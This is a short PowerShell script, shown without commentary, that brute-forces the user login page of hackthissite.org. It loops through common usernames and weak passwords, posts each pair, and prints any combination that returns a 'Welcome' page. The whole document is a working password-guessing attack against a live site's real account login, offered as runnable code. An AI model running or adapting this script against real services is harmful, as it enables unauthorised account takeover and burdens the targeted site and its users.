$loginUrl = "https://www.hackthissite.org/user/login"

$usernames = @("admin", "user", "test")
$passwords = @("password123", "123456", "letmein")

foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $body = @{
            username = $username
            password = $password
            'login' = 'Login'
        }

        try {
            $response = Invoke-WebRequest -Uri $loginUrl -Method Post -Body $body -SessionVariable session

            # Check if login was successful
            if ($response.Content -match "Welcome") {
                Write-Output "Valid credentials found: ${username}:${password}"
                break
            } elseif ($response.StatusCode -eq 200) {
                Write-Output "Attempt with ${username}:${password} failed."
            }
        } catch {
            Write-Output "Error: $_"
        }
    }
}
